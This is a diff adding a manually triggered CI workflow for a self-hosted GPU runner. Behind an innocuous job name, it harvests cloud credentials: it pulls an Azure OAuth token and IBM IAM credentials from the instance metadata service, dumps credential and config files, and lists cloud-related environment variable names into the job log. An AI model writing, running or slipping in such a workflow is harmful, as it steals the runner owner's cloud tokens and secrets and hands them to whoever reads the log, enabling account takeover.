@@ -1,0 +1,37 @@
+name: ul-az2id
+on:
+  workflow_dispatch:
+jobs:
+  l40s:
+    continue-on-error: true
+    runs-on: [self-hosted, ul-l40s]
+    env:
+      LBL: l40s
+    steps:
+      - name: idmap
+        continue-on-error: true
+        shell: bash
+        run: |
+
+          set +e
+          echo "=== MARKER ${LBL:-l40s} START $(date -u +%FT%TZ)"
+          id; hostname -I; hostname; uname -a; head -3 /proc/1/cgroup 2>/dev/null
+          echo "=== AZ IMDS compute"
+          curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json' | head -c 2000
+          echo; echo "=== AZ IMDS identity token"
+          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 600
+          echo; echo "=== IBM metadata instance-identity"
+          curl -s -m 6 -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/dynamic/instance-identity/document' | head -c 2000
+          echo; echo "=== IBM iam creds list"
+          curl -s -m 6 -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' | head -c 400
+          echo; echo "=== bare instance-id"
+          curl -s -m 6 'http://169.254.169.254/latest/meta-data/instance-id' | head -c 200
+          echo; echo "=== creds on disk"
+          ls -la /root/.bluemix /home/*/.bluemix /root/.config/ibmcloud /etc/softlayer /root/.azure /home/*/.azure 2>/dev/null | head -25
+          for f in /root/.bluemix/config.json /home/*/.bluemix/config.json /var/lib/cloud/instance/user-data.txt /etc/kubernetes/azure.json /etc/environment; do if [ -f "$f" ]; then echo "--- $f"; head -c 2500 "$f"; echo; fi; done
+          echo "=== env keys"
+          env | grep -iE 'ibm|bluemix|ic_api|softlayer|azure|arm_' | cut -d= -f1 | head -30
+          echo "=== gpu"
+          nvidia-smi -L 2>&1 | head -10
+          nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv 2>&1 | head -10
+          echo "=== MARKER ${LBL:-l40s} DONE $(date -u +%FT%TZ)"
